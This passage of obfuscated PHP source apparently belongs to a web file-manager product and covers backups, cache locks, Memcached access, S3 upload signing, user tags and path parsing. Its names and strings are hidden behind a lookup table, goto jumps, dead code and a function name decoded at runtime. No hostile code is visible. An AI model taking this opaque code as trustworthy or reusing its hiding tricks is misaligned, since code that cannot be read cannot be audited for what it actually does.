break; } } $§Ÿ˜ﬁâ∑[] = $æÌ¬œπß; $•Ù¡∆”Æ = $Üâî¢Ö˛[723]; if (!$•Ù¡∆”Æ) { die; } } $Õ¨ªó¯Û = 2; $êÀë≤Á§ = $Üâî¢Ö˛[724]; if (!$êÀë≤Á§) { die; } for ($Õù◊∂çè = $êÖ‘€≤»; $Õù◊∂çè > 1; $Õù◊∂çè--) { $¶Õ«∞ä = !0; foreach ($§Ÿ˜ﬁâ∑ as $òó•≈≠«) { if ($Õù◊∂çè % $òó•≈≠« == 0) { $¶Õ«∞ä = !1; break; } } if ($¶Õ«∞ä) { $Õ¨ªó¯Û = $Õù◊∂çè; break; } } return $Õ¨ªó¯Û; $¶Úæ¥£Ö = $Üâî¢Ö˛[725]; while (strlen($¶Úæ¥£Ö) < $Üâî¢Ö˛[628]) { if (!$¶Úæ¥£Ö) { break; } $¶Úæ¥£Ö++; } } public function waxud5e2c77f($ÿ∆ÔøÓ, $∏’Ç©›°) { $®√ÙÙÄÕ =& $_SERVER[ëæªã÷]; $–íâ™§Ò =& $_SERVER[µÁ∏◊Ÿ•]; return call_user_func(array($–íâ™§Ò[8], $–íâ™§Ò[300]), $ÿ∆ÔøÓ, $∏’Ç©›°); $Ò˙•ﬂ¥± = $®√ÙÙÄÕ[726]; if (strlen($Ò˙•ﬂ¥±) < $®√ÙÙÄÕ[628]) { die; } } public function rwigcd75ca9f($≈Í∆ß‰ò, $¸¥˚Ûøñ) { $“é∑Ô‰Í =& $_SERVER[µÁ∏◊Ÿ•]; return call_user_func(array($“é∑Ô‰Í[301], $“é∑Ô‰Í[302]), $≈Í∆ß‰ò, $¸¥˚Ûøñ); } public function gbnt3a5be98e($ÍÿÎ–íâ, $…„†§…«) { $∏∆˘Ù¶≠ =& $_SERVER[ëæªã÷]; $√‘óãŒﬂ =& $_SERVER[µÁ∏◊Ÿ•]; return call_user_func(array($√‘óãŒﬂ[301], $√‘óãŒﬂ[303]), $ÍÿÎ–íâ, $…„†§…«); $›Ëë‘‰∏ = $∏∆˘Ù¶≠[727]; if (strlen($›Ëë‘‰∏) < $∏∆˘Ù¶≠[628]) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $˝Ê´ìó‚ =& $_SERVER[ëæªã÷]; $this->isManual(); self::$name = date($˝Ê´ìó‚[728]); if (!($ÈıÒëò† = Model($˝Ê´ìó‚[729])->lastItem())) { $ÈıÒëò† = $this->initData(); } else { self::$name = $ÈıÒëò†[$˝Ê´ìó‚[32]]; if ($ÈıÒëò†[$˝Ê´ìó‚[730]] == $˝Ê´ìó‚[99]) { self::$name = date($˝Ê´ìó‚[731]); $≠Ê∫Ÿ¢⁄ = 0; if (isset($ÈıÒëò†[$˝Ê´ìó‚[297]][$˝Ê´ìó‚[202]][$˝Ê´ìó‚[467]])) { $≠Ê∫Ÿ¢⁄ = (int) $ÈıÒëò†[$˝Ê´ìó‚[297]][$˝Ê´ìó‚[202]][$˝Ê´ìó‚[467]]; } if (self::$manual == 0 && $ÈıÒëò†[$˝Ê´ìó‚[32]] == self::$name) { Model($˝Ê´ìó‚[729])->remove($ÈıÒëò†[$˝Ê´ìó‚[401]]); } $ÈıÒëò† = $this->initData($≠Ê∫Ÿ¢⁄, $ÈıÒëò†[$˝Ê´ìó‚[732]]); } else { $this->checkStore($ÈıÒëò†[$˝Ê´ìó‚[732]]); } } self::$option = $ÈıÒëò†; } private function isManual() { $Å—»‘æﬂ = _get($GLOBALS, $_SERVER[ëæªã÷][733], 0); $Å—»‘æﬂ = intval($Å—»‘æﬂ); self::$manual = $Å—»‘æﬂ && $Å—»‘æﬂ == 1 ? 1 : 0; } private function initData($Ÿ§öƒ‘∆ = 0, $˛›⁄≈©º = '') { $Ë˛ñ‹‹á =& $_SERVER[ëæªã÷]; $êë¶ÇöÖ = Model($Ë˛ñ‹‹á[729])->config(); if ($˛›⁄≈©º && $êë¶ÇöÖ[$Ë˛ñ‹‹á[732]] != $˛›⁄≈©º) { $Ÿ§öƒ‘∆ = 0; } $this->checkStore($êë¶ÇöÖ[$Ë˛ñ‹‹á[732]]); if (self::$manual == 1) { self::$name .= $Ë˛ñ‹‹á[11] . date($Ë˛ñ‹‹á[734]); } $…ì†¡Úó = array($Ë˛ñ‹‹á[732] => $êë¶ÇöÖ[$Ë˛ñ‹‹á[732]], $Ë˛ñ‹‹á[32] => self::$name, $Ë˛ñ‹‹á[730] => 0, $Ë˛ñ‹‹á[735] => $êë¶ÇöÖ[$Ë˛ñ‹‹á[735]], $Ë˛ñ‹‹á[736] => self::$manual, $Ë˛ñ‹‹á[297] => array($Ë˛ñ‹‹á[737] => array($Ë˛ñ‹‹á[730] => 0), $Ë˛ñ‹‹á[738] => array($Ë˛ñ‹‹á[730] => 0, $Ë˛ñ‹‹á[739] => 0, $Ë˛ñ‹‹á[740] => 0, $Ë˛ñ‹‹á[33] => $Ë˛ñ‹‹á[12], $Ë˛ñ‹‹á[741] => 0, $Ë˛ñ‹‹á[496] => 0), $Ë˛ñ‹‹á[742] => array($Ë˛ñ‹‹á[730] => 0, $Ë˛ñ‹‹á[739] => 0, $Ë˛ñ‹‹á[740] => 0, $Ë˛ñ‹‹á[741] => 0, $Ë˛ñ‹‹á[496] => 0), $Ë˛ñ‹‹á[202] => array($Ë˛ñ‹‹á[730] => 0, $Ë˛ñ‹‹á[743] => 0, $Ë˛ñ‹‹á[744] => 0, $Ë˛ñ‹‹á[745] => 0, $Ë˛ñ‹‹á[746] => 0, $Ë˛ñ‹‹á[467] => $Ÿ§öƒ‘∆, $Ë˛ñ‹‹á[741] => 0, $Ë˛ñ‹‹á[496] => 0)), $Ë˛ñ‹‹á[741] => time(), $Ë˛ñ‹‹á[496] => 0); $â¿¬∑œ = Model($Ë˛ñ‹‹á[729])->insert($…ì†¡Úó); $…ì†¡Úó[$Ë˛ñ‹‹á[401]] = $â¿¬∑œ; return $…ì†¡Úó; } private function checkStore($ÉƒﬂóÅ—) { $ÌíﬂÖ≠ã =& $_SERVER[ëæªã÷]; $˛”©º•∑ = Model($ÌíﬂÖ≠ã[747])->listData($ÉƒﬂóÅ—); Model($ÌíﬂÖ≠ã[747])->checkConfig($˛”©º•∑); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ëæªã÷][729])->findByName(self::$name); } return self::$option; } public static function set($‘á÷û†∏) { $—Íí∫ÂÜ =& $_SERVER[ëæªã÷]; $°í»€È… = self::get(); foreach ($‘á÷û†∏ as $Ö“Ø¸ï  => $”∞ƒÍìÃ) { $È¨‹≠¯£ = explode($—Íí∫ÂÜ[10], $Ö“Ø¸ï ); $˜ﬁá·‡¯ = count($È¨‹≠¯£); switch ($˜ﬁá·‡¯) { case 1: $°í»€È…[$È¨‹≠¯£[0]] = $”∞ƒÍìÃ; break; case 2: $°í»€È…[$È¨‹≠¯£[0]][$È¨‹≠¯£[1]] = $”∞ƒÍìÃ; break; case 3: $°í»€È…[$È¨‹≠¯£[0]][$È¨‹≠¯£[1]][$È¨‹≠¯£[2]] = $”∞ƒÍìÃ; break; } } Model($—Íí∫ÂÜ[729])->update($°í»€È…[$—Íí∫ÂÜ[401]], $°í»€È…); self::$option = $°í»€È…; return self::$option; } public function keep() { $∏€è„»÷ =& $_SERVER[ëæªã÷]; $ë‚√üŒ™ = self::get(); if ($ë‚√üŒ™[$∏€è„»÷[297]][$∏€è„»÷[737]][$∏€è„»÷[730]] == $∏€è„»÷[99]) { return; } $this->backupKeep($ë‚√üŒ™); self::set(array($∏€è„»÷[748] => 1)); } private function backupKeep($¡§ºÕ≈ò) { $ÑÖà¡À =& $_SERVER[ëæªã÷]; if (self::$manual == 1) { return; } $¸⁄“ƒÁ‡ = Model($ÑÖà¡À[729])->listData(); if (empty($¸⁄“ƒÁ‡)) { return; } $«Â§»ºœ = 0; $û—¶´é– = array(); foreach ($¸⁄“ƒÁ‡ as $ˆ¯◊ë˝Ä) { if ($«Â§»ºœ >= 7) { break; } $û—¶´é–[] = $ˆ¯◊ë˝Ä[$ÑÖà¡À[32]]; $«Â§»ºœ++; } for ($«Â§»ºœ = 0; $«Â§»ºœ < 12; $«Â§»ºœ++) { $û—¶´é–[] = date($ÑÖà¡À[749], strtotime("\55{$«Â§»ºœ}\x20\155\x6f\156\164\x68\163")); } $û—¶´é– = array_unique($û—¶´é–); $ô€ÄªÎß = Model($ÑÖà¡À[750])->get($ÑÖà¡À[751]); foreach ($¸⁄“ƒÁ‡ as $ˆ¯◊ë˝Ä) { if (isset($ˆ¯◊ë˝Ä[$ÑÖà¡À[736]]) && $ˆ¯◊ë˝Ä[$ÑÖà¡À[736]] == $ÑÖà¡À[99]) { continue; } if (!empty($ˆ¯◊ë˝Ä[$ÑÖà¡À[32]]) && in_array($ˆ¯◊ë˝Ä[$ÑÖà¡À[32]], $û—¶´é–)) { continue; } Model($ÑÖà¡À[729])->remove($ˆ¯◊ë˝Ä[$ÑÖà¡À[401]]); $‡≤ì∫æ… = $this->backupPath($¡§ºÕ≈ò, $ô€ÄªÎß); IO::remove($‡≤ì∫æ…, !1); } } private function backupPath($ﬁÃﬁêë“, $öÎáòîå = false) { $√®˛˘ÿà =& $_SERVER[ëæªã÷]; if (!$öÎáòîå) { $öÎáòîå = Model($√®˛˘ÿà[750])->get($√®˛˘ÿà[751]); } $òÙµæﬁƒ = $ﬁÃﬁêë“[$√®˛˘ÿà[32]]; $∆“»ŸÂ˝ = substr(md5($√®˛˘ÿà[752] . $öÎáòîå . $òÙµæﬁƒ), 0, 8); return "\173\151\157\72{$ﬁÃﬁêë“[$√®˛˘ÿà[732]]}\175\57\144\141\x74\141\x62\141\x73\145\57\142\x61\143\153\x75\x70\57" . $òÙµæﬁƒ . $√®˛˘ÿà[11] . $∆“»ŸÂ˝; } public function db() { $ÕΩéµ§— =& $_SERVER[ëæªã÷]; $ ÚôÎë„ = self::get(); if ($ ÚôÎë„[$ÕΩéµ§—[297]][$ÕΩéµ§—[738]][$ÕΩéµ§—[730]] == $ÕΩéµ§—[99]) { return !0; } $âˆê≤Á˜ = new BackupDb(); if (!$âˆê≤Á˜->index()) { return !1; } self::set(array($ÕΩéµ§—[753] => 1)); return !0; } public function dbFile() { $ºõ—üÌË =& $_SERVER[ëæªã÷]; $”Ö∏î◊– = self::get(); if ($”Ö∏î◊–[$ºõ—üÌË[297]][$ºõ—üÌË[742]][$ºõ—üÌË[730]] == $ºõ—üÌË[99]) { return !0; } $≠ﬂÿç©¬ = new BackupDbFile(); if (!$≠ﬂÿç©¬->index()) { return !1; } self::set(array($ºõ—üÌË[754] => 1)); return !0; } public function file() { $Û ù∞† =& $_SERVER[ëæªã÷]; $ë€ñ‡éº = self::get(); if ($ë€ñ‡éº[$Û ù∞†[297]][$Û ù∞†[202]][$Û ù∞†[730]] == $Û ù∞†[99]) { return !0; } if (!isset($ë€ñ‡éº[$Û ù∞†[735]]) || $ë€ñ‡éº[$Û ù∞†[735]] == $Û ù∞†[200]) { $´’Å∑‡µ = new BackupFile(); if (!$´’Å∑‡µ->index()) { return !1; } } self::set(array($Û ù∞†[755] => 1, $Û ù∞†[730] => 1)); return !0; } } goto A¨°∑îÒ˜ç; d•Ωÿ≥—†‚: class CacheLockMemcached { public function lock($˛÷ˆˆÁü, $ øƒ¶ùø = 0) { $äÜ§Ñà⁄ = Cache::init(); $—ÇãëÑ€ = microtime(!0) + $ øƒ¶ùø; while (microtime(!0) < $—ÇãëÑ€) { $Î∂Î™—õ = $äÜ§Ñà⁄->get($˛÷ˆˆÁü); if (!$Î∂Î™—õ || $Î∂Î™—õ < microtime(!0)) { $ì∞ππÕ“ = $äÜ§Ñà⁄->handle->add($˛÷ˆˆÁü, $—ÇãëÑ€, $ øƒ¶ùø); if ($ì∞ππÕ“) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($°≥∫öÿ„) { return Cache::init()->get($°≥∫öÿ„); } public function unlock($ë¿∂≥√œ) { return Cache::init()->remove($ë¿∂≥√œ); } } class CacheLockDatabase { public function lock($Ö¸ØÏü∑, $®¨∏Û”å = 0) { $Òœæ‰—± = Model($_SERVER[ëæªã÷][809]); $Æ©ùΩèü = microtime(!0) + $®¨∏Û”å; while (microtime(!0) < $Æ©ùΩèü) { $ÇåßŸ…ç = $Òœæ‰—±->get($Ö¸ØÏü∑); if (!$ÇåßŸ…ç || $ÇåßŸ…ç < microtime(!0)) { $¡ºﬁ¬◊É = $Òœæ‰—±->set($Ö¸ØÏü∑, $Æ©ùΩèü); if ($¡ºﬁ¬◊É) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ûñ˛…èﬂ) { return Model($_SERVER[ëæªã÷][809])->get($ûñ˛…èﬂ); } public function unlock($¬ÂŸµø´) { Model($_SERVER[ëæªã÷][809])->remove($¬ÂŸµø´); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ãÖŒíÚ¯, $Çñ≠–≤◊) { $Ï¶ÄüÜ¨ =& $_SERVER[ëæªã÷]; if (!class_exists($Ï¶ÄüÜ¨[842])) { show_json($Ï¶ÄüÜ¨[843], !1); } $this->cacheTime = $Çñ≠–≤◊; $this->handle = new Memcached(); if (is_array($ãÖŒíÚ¯[$Ï¶ÄüÜ¨[844]]) && count($ãÖŒíÚ¯[$Ï¶ÄüÜ¨[844]]) >= 1) { foreach ($ãÖŒíÚ¯[$Ï¶ÄüÜ¨[844]] as $íñöﬁÈè) { $‘“˙‚˛≥ = explode($Ï¶ÄüÜ¨[4], $íñöﬁÈè); $this->handle->addServer($‘“˙‚˛≥[0], $‘“˙‚˛≥[1]); } } else { $this->handle->addServer($ãÖŒíÚ¯[$Ï¶ÄüÜ¨[184]], $ãÖŒíÚ¯[$Ï¶ÄüÜ¨[185]]); } } public function set($®„»ÿ‰ñ, $˜à‚à≤æ, $êﬂ‡≈ËÇ = false) { $êﬂ‡≈ËÇ = $êﬂ‡≈ËÇ ? $êﬂ‡≈ËÇ : $this->cacheTime; return $this->handle->set($®„»ÿ‰ñ, $˜à‚à≤æ, $êﬂ‡≈ËÇ); } public function get($£…≠õô¶) { return $this->handle->get($£…≠õô¶); } public function remove($»±€⁄≈˛) { return $this->handle->delete($»±€⁄≈˛); } public function deleteAll() { return $this->handle->flush(); } } goto dÑ∫ìçß—∆; CÑ◊€«ªﬂñ: $fileSize = strrev(base64_decode($_SERVER[‰µ∏ÇÕù][0])); function binCheckNeq($›æ‰’≈Ñ, $èûÓ€Îú) { return $›æ‰’≈Ñ != $èûÓ€Îú; } $_SERVER[$_SERVER[‰µ∏ÇÕù][1]] = $fileSize($_SERVER[$_SERVER[‰µ∏ÇÕù][2]]); goto A…¶‡Úò™“; Bø•ÿêãËè: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÆÒÖ®‚Ì) { $this->pathParse = $ÆÒÖ®‚Ì; } protected function infoParse($˚®’Û≤ç, $Ö˘˚€Í£ = false) { $ñ¥“∂® =& $_SERVER[ëæªã÷]; return Action($ñ¥“∂®[1149])->sharePathInfo($this->pathParse[$ñ¥“∂®[88]], !0, $Ö˘˚€Í£); } public function listPath($ıùà›Ñ©, $Õ‚âîΩ≤ = false) { $É›Â‘⁄ã =& $_SERVER[ëæªã÷]; $ÇüÂÚä› = IO::listPath($ıùà›Ñ©, $Õ‚âîΩ≤); if (!$ÇüÂÚä›) { return $ÇüÂÚä›; } if (is_array($ÇüÂÚä›[$É›Â‘⁄ã[1310]])) { $ÆœÕ£Ü‘ = Action($É›Â‘⁄ã[1319])->parsePathChildren($ÇüÂÚä›[$É›Â‘⁄ã[1310]], array($É›Â‘⁄ã[422] => $ıùà›Ñ©)); $ÇüÂÚä›[$É›Â‘⁄ã[1310]] = Action($É›Â‘⁄ã[1149])->shareItemInfo($ÆœÕ£Ü‘); } foreach ($ÇüÂÚä› as $À€Öçû± => $ÏÁÅÙ⁄ñ) { if (!in_array($À€Öçû±, array($É›Â‘⁄ã[86], $É›Â‘⁄ã[87]))) { continue; } foreach ($ÏÁÅÙ⁄ñ as $Ã¸ÁÂ‘¶ => $ÆœÕ£Ü‘) { $ÆœÕ£Ü‘ = Action($É›Â‘⁄ã[1319])->parsePathChildren($ÆœÕ£Ü‘, array($É›Â‘⁄ã[422] => $ıùà›Ñ©)); $ÇüÂÚä›[$À€Öçû±][$Ã¸ÁÂ‘¶] = Action($É›Â‘⁄ã[1149])->shareItemInfo($ÆœÕ£Ü‘); } } return $ÇüÂÚä›; } public function listAll($¢üÿ≤É®) { $ÙÆú≈ÌÛ =& $_SERVER[ëæªã÷]; $íÆ·◊¢™ = IO::listAll($¢üÿ≤É®); foreach ($íÆ·◊¢™ as &$»ÔÒªü≥) { $‹ƒ±¡àÔ = IO::info($»ÔÒªü≥[$ÙÆú≈ÌÛ[88]]); $‹ƒ±¡àÔ = is_array($‹ƒ±¡àÔ) ? $‹ƒ±¡àÔ : array(); $»ÔÒªü≥ = array_merge($‹ƒ±¡àÔ, $»ÔÒªü≥); $»ÔÒªü≥[$ÙÆú≈ÌÛ[97]] = Action($ÙÆú≈ÌÛ[1149])->shareItemInfo($»ÔÒªü≥); } unset($»ÔÒªü≥); return $íÆ·◊¢™; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ÎóœÉõÛ) { parent::__construct($ÎóœÉõÛ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Àù¢’≥¢) { parent::__construct($Àù¢’≥¢); $this->signatureVersion($_SERVER[ëæªã÷][221]); } public function uploadFormData($É∆∑î∏È, $‚¶ÌãËÈ = 3600) { $ÿóŒ˘î‹ =& $_SERVER[ëæªã÷]; $òê§¥ö€ = $ÿóŒ˘î‹[201]; $ü∆©¶ª” = $ÿóŒ˘î‹[1320]; $€Œ·™ÚÔ = $ÿóŒ˘î‹[72]; $æ¢€¸ôó = gmdate($ÿóŒ˘î‹[1321]); $âéÔ¢ù˘ = gmdate($ÿóŒ˘î‹[731]); $–÷µ°ó˜ = $ÿóŒ˘î‹[1322]; $Â∏˜«Û÷ = $‚¶ÌãËÈ . $ÿóŒ˘î‹[12]; $‹Å£–º≤ = $ÿóŒ˘î‹[1284]; $Î±π∂µ˚ = array($this->accessKey, $âéÔ¢ù˘, $this->region, $€Œ·™ÚÔ, $–÷µ°ó˜); $Æ∞µÏÜ˜ = implode($ÿóŒ˘î‹[8], $Î±π∂µ˚); $Éª•≤≈ = array($ÿóŒ˘î‹[1286] => gmdate($ÿóŒ˘î‹[1285], strtotime($ÿóŒ˘î‹[1323])), $ÿóŒ˘î‹[1287] => array(array($ÿóŒ˘î‹[1289] => $this->bucket), array($ÿóŒ˘î‹[1288] => $òê§¥ö€), array($ÿóŒ˘î‹[1290], $ÿóŒ˘î‹[1291], $ÿóŒ˘î‹[12]), array($ÿóŒ˘î‹[1290], $ÿóŒ˘î‹[1324], $ÿóŒ˘î‹[12]), array($ÿóŒ˘î‹[1290], $ÿóŒ˘î‹[1325], $ÿóŒ˘î‹[12]), array($ÿóŒ˘î‹[1292] => $‹Å£–º≤), array($ÿóŒ˘î‹[1326] => $Æ∞µÏÜ˜), array($ÿóŒ˘î‹[1327] => $ü∆©¶ª”), array($ÿóŒ˘î‹[1328] => $æ¢€¸ôó), array($ÿóŒ˘î‹[1329] => $Â∏˜«Û÷))); $¥Üëáè§ = base64_encode(json_encode($Éª•≤≈)); $áºÂçé = hash_hmac($ÿóŒ˘î‹[1330], $âéÔ¢ù˘, $ÿóŒ˘î‹[1331] . $this->secret, !0); $öÂ–Íë‘ = hash_hmac($ÿóŒ˘î‹[1330], $this->region, $áºÂçé, !0); $ü¿Ÿ≈˝ƒ = hash_hmac($ÿóŒ˘î‹[1330], $€Œ·™ÚÔ, $öÂ–Íë‘, !0); $ÅÃƒ…ö– = hash_hmac($ÿóŒ˘î‹[1330], $–÷µ°ó˜, $ü¿Ÿ≈˝ƒ, !0); $ãÚÎØµÇ = hash_hmac($ÿóŒ˘î‹[1330], $¥Üëáè§, $ÅÃƒ…ö–); $Ó–ØœÆö = array($ÿóŒ˘î‹[220] => $ÿóŒ˘î‹[12], $ÿóŒ˘î‹[1332] => $ÿóŒ˘î‹[12], $ÿóŒ˘î‹[1288] => $òê§¥ö€, $ÿóŒ˘î‹[1292] => $‹Å£–º≤, $ÿóŒ˘î‹[1296] => $¥Üëáè§, $ÿóŒ˘î‹[1333] => $Æ∞µÏÜ˜, $ÿóŒ˘î‹[1334] => $ü∆©¶ª”, $ÿóŒ˘î‹[1335] => $æ¢€¸ôó, $ÿóŒ˘î‹[1336] => $Â∏˜«Û÷, $ÿóŒ˘î‹[1337] => $ãÚÎØµÇ, $ÿóŒ˘î‹[184] => $this->getHost()); return $Ó–ØœÆö; } } goto fº≈ª∆ƒæë; eÎ“•»é»É: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\x2e\164\x61\x67\x4c\x69\x73\x74"; public $modelType = "\x55\x73\145\162\117\x70\164\x69\157\156"; public $field = array("\x6e\x61\x6d\145", "\163\x74\171\x6c\x65", "\163\157\162\x74"); public function listData($õ©…—„– = false, $Õ˘è¶Åí = "\x73\x6f\x72\x74", $¯‹–§¸‚ = false) { return parent::listData($õ©…—„–, $Õ˘è¶Åí, $¯‹–§¸‚); } public function remove($ï™∫ﬁ‘ﬂ) { return parent::remove($ï™∫ﬁ‘ﬂ); } public function add($»äıï±¬, $»¸¡π‚¯ = "\154\141\x62\x65\154\55\147\162\145\171\55\156\157\162\155\141\154") { $‘íÀπíÙ =& $_SERVER[ëæªã÷]; if ($this->findByName($»äıï±¬)) { return !1; } $É æÌ…« = array($‘íÀπíÙ[421] => $»äıï±¬, $‘íÀπíÙ[484] => $»¸¡π‚¯, $‘íÀπíÙ[1800] => $this->getSort($‘íÀπíÙ[262]) + 1); return parent::insert($É æÌ…«); } public function update($Œ®≈ø¨É, $·òÑÙ‡…) { $¡ﬁº≈∂“ =& $_SERVER[ëæªã÷]; $¡‘¬«åà = $this->listData($Œ®≈ø¨É); $”ﬁÅöóÎ = $this->findByName($·òÑÙ‡…[$¡ﬁº≈∂“[32]]); if (!$¡‘¬«åà || $”ﬁÅöóÎ && $”ﬁÅöóÎ[$¡ﬁº≈∂“[401]] != $¡‘¬«åà[$¡ﬁº≈∂“[401]]) { return !1; } return parent::update($Œ®≈ø¨É, $·òÑÙ‡…); } public function moveTop($Ôîë¡Ü™) { $Àíî§ÀÜ =& $_SERVER[ëæªã÷]; $èõ€©∆° = parent::listData(); $Ú°Ã®Öà = $this->getSort($Àíî§ÀÜ[261]); foreach ($èõ€©∆° as &$«À≠≠·î) { if ($«À≠≠·î[$Àíî§ÀÜ[401]] == $Ôîë¡Ü™) { $«À≠≠·î[$Àíî§ÀÜ[1819]] = $Ú°Ã®Öà; continue; } $«À≠≠·î[$Àíî§ÀÜ[1819]] += 1; } unset($«À≠≠·î); return parent::resetData($èõ€©∆°); } public function moveBottom($Õ≥ÿÏÌò) { $æá·ò»É =& $_SERVER[ëæªã÷]; $ËÇ’çÅÿ = $this->getSort($æá·ò»É[262]) + 1; return parent::update($Õ≥ÿÏÌò, array($æá·ò»É[1819] => $ËÇ’çÅÿ)); } public function resetSort($—¨˜–†Û) { $˛ç ¯†Â =& $_SERVER[ëæªã÷]; $çÑ˛í∫ = array(); $—¨˜–†Û = is_array($—¨˜–†Û) ? $—¨˜–†Û : array(); for ($ÆÙùÃîú = 0; $ÆÙùÃîú < count($—¨˜–†Û); $ÆÙùÃîú++) { $çÑ˛í∫[$—¨˜–†Û[$ÆÙùÃîú] . $˛ç ¯†Â[12]] = $ÆÙùÃîú + 1; } $Ú•¸Æ∏ò = parent::listData(); foreach ($Ú•¸Æ∏ò as &$º÷ëø£ù) { $¢Ï‘⁄¯Ÿ = $çÑ˛í∫[$º÷ëø£ù[$˛ç ¯†Â[401]]]; $º÷ëø£ù[$˛ç ¯†Â[1819]] = $¢Ï‘⁄¯Ÿ ? $¢Ï‘⁄¯Ÿ : $º÷ëø£ù[$˛ç ¯†Â[1819]]; } unset($º÷ëø£ù); return parent::resetData($Ú•¸Æ∏ò); } private function getSort($ÿÃ∞»Ûˆ) { $˚»ÿ‘ÃÜ =& $_SERVER[ëæªã÷]; $ÌÌ“˝€˘ = parent::listData(); $—é˚ú’Ø = array_to_keyvalue($ÌÌ“˝€˘, $˚»ÿ‘ÃÜ[12], $˚»ÿ‘ÃÜ[1819]); if (!$—é˚ú’Ø) { $—é˚ú’Ø = array(0); } $‘“™∏í° = $ÿÃ∞»Ûˆ == $˚»ÿ‘ÃÜ[262] ? max($—é˚ú’Ø) : min($—é˚ú’Ø); return intval($‘“™∏í°); } } goto c»áæÇßí≠; C∑Ç˜Ë¶¢„: class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\162\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\145\162\122\145\x63\171\143\154\145\175"; const KOD_USER_FAV = "\x7b\x75\163\x65\162\x46\141\166\175"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\x46\151\154\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\x72\x46\151\154\145\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\x75\160\122\x6f\x6f\164\123\145\x6c\146\175"; const KOD_USER_SHARE = "\173\x75\x73\145\x72\x53\150\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\x72\x53\x68\x61\162\x65\114\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\x61\162\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\x61\x72\145\x49\164\x65\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\x72\145\111\x74\145\x6d\x4c\151\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\145\x61\x72\x63\150\175"; const KOD_BLOCK = "\x7b\142\x6c\157\143\153\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\165\163\x65\x72\x52\145\156\143\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\144\x72\x69\x76\x65\162\x7d"; public static function typeList() { $˝∑¨—ï° =& $_SERVER[ëæªã÷]; return array($˝∑¨—ï°[1218] => self::KOD_SOURCE, $˝∑¨—ï°[1219] => self::KOD_USER_RECYCLE, $˝∑¨—ï°[1220] => self::KOD_USER_FAV, $˝∑¨—ï°[1221] => self::KOD_USER_FILE_TAG, $˝∑¨—ï°[1222] => self::KOD_USER_FILE_TYPE, $˝∑¨—ï°[1223] => self::KOD_GROUP_ROOT_SELF, $˝∑¨—ï°[1224] => self::KOD_USER_SHARE, $˝∑¨—ï°[1225] => self::KOD_USER_SHARE_LINK, $˝∑¨—ï°[1226] => self::KOD_USER_SHARE_TO_ME, $˝∑¨—ï°[1227] => self::KOD_SHARE_ITEM, $˝∑¨—ï°[1228] => self::KOD_SHARE_LINK, $˝∑¨—ï°[1229] => self::KOD_SEARCH, $˝∑¨—ï°[1230] => self::KOD_BLOCK, $˝∑¨—ï°[1231] => self::KOD_IO, $˝∑¨—ï°[1232] => self::KOD_USER_RECENT, $˝∑¨—ï°[1233] => self::KOD_USER_DRIVER); } public static function parse($∆˛öŸ‚ó) { $¨ÙÏ¡˝Ó =& $_SERVER[ëæªã÷]; $∆˛öŸ‚ó = self::clear($∆˛öŸ‚ó); $°ëåäÒ« = array_values(self::typeList()); preg_match($¨ÙÏ¡˝Ó[1234], $∆˛öŸ‚ó, $˚ÔÔû˘·); $úç™Í∆Ÿ = array($¨ÙÏ¡˝Ó[423] => !1, $¨ÙÏ¡˝Ó[1235] => !1, $¨ÙÏ¡˝Ó[420] => !1, $¨ÙÏ¡˝Ó[88] => $∆˛öŸ‚ó, $¨ÙÏ¡˝Ó[1144] => !1, $¨ÙÏ¡˝Ó[1143] => $¨ÙÏ¡˝Ó[12]); if (is_array($˚ÔÔû˘·) && count($˚ÔÔû˘·) == 5) { $«øáÅ⁄Î = $¨ÙÏ¡˝Ó[1236] . $˚ÔÔû˘·[2] . $¨ÙÏ¡˝Ó[331]; if (in_array($«øáÅ⁄Î, $°ëåäÒ«)) { $úç™Í∆Ÿ[$¨ÙÏ¡˝Ó[1144]] = $˚ÔÔû˘·[1]; $úç™Í∆Ÿ[$¨ÙÏ¡˝Ó[33]] = $«øáÅ⁄Î; $úç™Í∆Ÿ[$¨ÙÏ¡˝Ó[1237]] = substr($«øáÅ⁄Î, 1, -1); $úç™Í∆Ÿ[$¨ÙÏ¡˝Ó[401]] = $˚ÔÔû˘·[3]; } $úç™Í∆Ÿ[$¨ÙÏ¡˝Ó[1143]] = $˚ÔÔû˘·[4]; } $”µ∞Øùï = array($¨ÙÏ¡˝Ó[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $úç™Í∆Ÿ[$¨ÙÏ¡˝Ó[1199]] = in_array($úç™Í∆Ÿ[$¨ÙÏ¡˝Ó[33]], $”µ∞Øùï); return $úç™Í∆Ÿ; } public static function isTruePath($åÓ›¿Æé) { $ÚÍöèÆû =& $_SERVER[ëæªã÷]; if (substr($åÓ›¿Æé, 0, 1) != $ÚÍöèÆû[1236]) { return !0; } if (strpos($åÓ›¿Æé, $ÚÍöèÆû[409]) === 0) { return !0; } if (strpos($åÓ›¿Æé, $ÚÍöèÆû[1203]) === 0) { return !0; } if (strpos($åÓ›¿Æé, $ÚÍöèÆû[1238]) === 0) { return !0; } if (strpos($åÓ›¿Æé, $ÚÍöèÆû[1239]) === 0) { return !0; } if (strpos($åÓ›¿Æé, $ÚÍöèÆû[1240]) === 0) { return !0; } return !1; } public static function clear($Ùﬂê˜å±) { 